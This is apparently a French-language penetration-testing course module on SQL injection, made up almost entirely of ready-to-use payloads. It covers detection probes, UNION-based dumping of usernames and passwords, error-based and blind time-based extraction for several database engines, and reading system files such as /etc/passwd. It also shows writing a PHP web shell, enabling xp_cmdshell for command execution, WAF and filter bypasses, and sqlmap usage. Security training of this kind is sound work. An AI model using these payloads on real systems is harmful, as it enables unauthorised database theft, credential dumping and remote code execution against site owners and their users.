# 17 — SQL Injection Fundamentals

## Objectifs
Détecter et exploiter les injections SQL : UNION, error-based, blind boolean/time-based, second-order ; contourner les filtres ; adapter les payloads à MySQL, MSSQL, PostgreSQL, SQLite, Oracle.

---

## 1. Détection

```bash
# Casser la requête
'  "  `  ')  ")  ;--  #
?id=1'
?id=1"
?id=1' AND 1=1-- -
?id=1' AND 1=2-- -

# Différence booléenne
?id=1 AND 1=1
?id=1 AND 1=2

# Erreurs
?id=1'
?id=1\'

# Time-based
?id=1' AND SLEEP(5)-- -
?id=1'; WAITFOR DELAY '0:0:5'-- -
?id=1' OR pg_sleep(5)-- -
```

### Points d'injection possibles
- Paramètres GET/POST, cookies, headers (`User-Agent`, `X-Forwarded-For`)
- JSON body, XML
- ORDER BY / LIMIT (numériques)
- Login forms

---

## 2. Déterminer le nombre de colonnes

```sql
' ORDER BY 1-- -
' ORDER BY 2-- -
' ORDER BY 3-- -        -- erreur → 2 colonnes
' UNION SELECT NULL-- -
' UNION SELECT NULL,NULL-- -
' UNION SELECT NULL,NULL,NULL-- -
```

### Trouver les colonnes affichées
```sql
' UNION SELECT 1,2,3-- -
' UNION SELECT 'a','b','c'-- -
```

---

## 3. UNION-based

```sql
-- Bases / version
' UNION SELECT 1,database(),version()-- -
' UNION SELECT 1,user(),@@version-- -

-- Tables (MySQL)
' UNION SELECT 1,table_name,3 FROM information_schema.tables WHERE table_schema=database()-- -

-- Colonnes
' UNION SELECT 1,column_name,3 FROM information_schema.columns WHERE table_name='users'-- -

-- Données
' UNION SELECT 1,username,password FROM users-- -

-- Concaténer
' UNION SELECT 1,group_concat(username,0x3a,password),3 FROM users-- -
```

### MSSQL
```sql
' UNION SELECT 1,name,3 FROM sys.databases-- -
' UNION SELECT 1,table_name,3 FROM information_schema.tables-- -
' UNION SELECT 1,username,password FROM users-- -
```

### PostgreSQL
```sql
' UNION SELECT 1,current_database(),version()-- -
' UNION SELECT 1,table_name,3 FROM information_schema.tables-- -
' UNION SELECT 1,string_agg(username||':'||password,','),3 FROM users-- -
```

### SQLite
```sql
' UNION SELECT 1,name,3 FROM sqlite_master WHERE type='table'-- -
' UNION SELECT 1,sql,3 FROM sqlite_master-- -
```

---

## 4. Error-based

```sql
-- MySQL (extractvalue / updatexml)
' AND extractvalue(1,concat(0x7e,(SELECT database())))-- -
' AND updatexml(1,concat(0x7e,(SELECT version())),1)-- -

-- MSSQL (convert)
' AND 1=convert(int,(SELECT @@version))-- -

-- PostgreSQL (cast)
' AND 1=cast((SELECT current_database()) as int)-- -
```

---

## 5. Blind boolean

```sql
-- Longueur
' AND (SELECT LENGTH(database()))=5-- -
' AND (SELECT LENGTH(database()))>5-- -

-- Caractère par caractère (substr / ascii)
' AND ASCII(SUBSTR((SELECT database()),1,1))>100-- -
' AND SUBSTRING((SELECT password FROM users LIMIT 1),1,1)='a'-- -

-- Table existante
' AND (SELECT COUNT(*) FROM information_schema.tables WHERE table_name='users')=1-- -
```

Automatisation : `sqlmap --technique=B` ou script Python (cf. module 18).

---

## 6. Blind time-based

```sql
-- MySQL
' AND IF(1=1,SLEEP(3),0)-- -
' AND IF(ASCII(SUBSTR(database(),1,1))>100,SLEEP(3),0)-- -

-- MSSQL
'; IF (1=1) WAITFOR DELAY '0:0:3'-- -
'; IF (ASCII(SUBSTRING((SELECT DB_NAME()),1,1))>100) WAITFOR DELAY '0:0:3'-- -

-- PostgreSQL
'; SELECT CASE WHEN (1=1) THEN pg_sleep(3) ELSE pg_sleep(0) END-- -
```

---

## 7. Écriture / lecture de fichiers

### MySQL
```sql
-- Lecture (FILE priv)
' UNION SELECT LOAD_FILE('/etc/passwd')-- -
' UNION SELECT LOAD_FILE('C:\\Windows\\win.ini')-- -

-- Écriture (secure_file_priv vide)
' UNION SELECT '<?php system($_GET["c"]); ?>' INTO OUTFILE '/var/www/html/shell.php'-- -
' UNION SELECT '...' INTO DUMPFILE '/var/www/html/shell.php'-- -
```

### MSSQL
```sql
-- xp_cmdshell
'; EXEC sp_configure 'show advanced options',1; RECONFIGURE;-- -
'; EXEC sp_configure 'xp_cmdshell',1; RECONFIGURE;-- -
'; EXEC xp_cmdshell 'whoami'-- -

-- Lecture
' UNION SELECT 1,BulkColumn,3 FROM OPENROWSET(BULK 'C:\Windows\win.ini',SINGLE_CLOB)-- -
```

### PostgreSQL
```sql
-- Copie vers un fichier (superuser)
'; COPY (SELECT '') TO PROGRAM 'id > /tmp/pwned'-- -
```

---

## 8. Contournement de filtres

| Filtre | Bypass |
|---|---|
| Espaces | `/**/`, `%09`, `%0a`, `+`, `()` |
| `SELECT` | `SeLeCt`, `SEL/**/ECT`, `%53%45%4c%45%43%54` |
| `UNION` | `UN/**/ION`, `UNION ALL SELECT` |
| Quotes | `0x61646d696e` (hex), `CHAR(97,100,109,105,110)` |
| `OR`/`AND` | `||`, `&&`, `OORR` |
| Commentaires | `-- -`, `#`, `/**/` |
| WAF | casse, encodage double URL, HTTP parameter pollution |

```sql
-- Sans espaces
'/**/UNION/**/SELECT/**/1,2,3-- -
'UNION(SELECT(1),(2),(3))-- -

-- Sans quotes
' AND username=0x61646d696e-- -
' AND username=CHAR(97,100,109,105,110)-- -
```

### Second-order SQLi
L'entrée est stockée (ex. username) puis réutilisée dans une requête sans échappement. Tester en créant un compte `admin'-- -` puis en déclenchant une requête qui l'utilise.

---

## 9. Exploitation → RCE

```bash
# MySQL : INTO OUTFILE → web shell
# MSSQL : xp_cmdshell / CLR
# PostgreSQL : COPY TO PROGRAM (superuser)
# Oracle : DBMS_SCHEDULER / Java
```

### Hash dumping → cracking
```sql
' UNION SELECT 1,username,password FROM users-- -
# MySQL 4.1+ : *HASH (mysql_native_password), SHA1, bcrypt
```

---

## 10. Outils

```bash
# sqlmap (détail module 18)
sqlmap -u "http://<TARGET>/?id=1" --batch --dbs

# Détection manuelle rapide avec ffuf
ffuf -u "http://<TARGET>/?id=FUZZ" -w sqli_payloads.txt -mr "SQL syntax|mysql_fetch|ORA-"

# WAF
wafw00f http://<TARGET>
```

---

## Checklist
- [ ] Point d'injection identifié (GET/POST/cookie/header)
- [ ] SGBD déterminé (version, erreurs)
- [ ] Nombre de colonnes / type d'injection
- [ ] Données extraites (bases, tables, colonnes, creds)
- [ ] Possibilité d'écriture de fichier / RCE testée
- [ ] Filtres contournés si nécessaire
- [ ] Requête et preuve sauvegardées

## Aide-mémoire SGBD
| SGBD | Version | Tables | Concat |
|---|---|---|---|
| MySQL | `version()` | `information_schema.tables` | `group_concat()` |
| MSSQL | `@@version` | `information_schema.tables` | `+` |
| PostgreSQL | `version()` | `information_schema.tables` | `\|\|` |
| SQLite | `sqlite_version()` | `sqlite_master` | `\|\|` |
| Oracle | `v$version` | `all_tables` | `\|\|` |
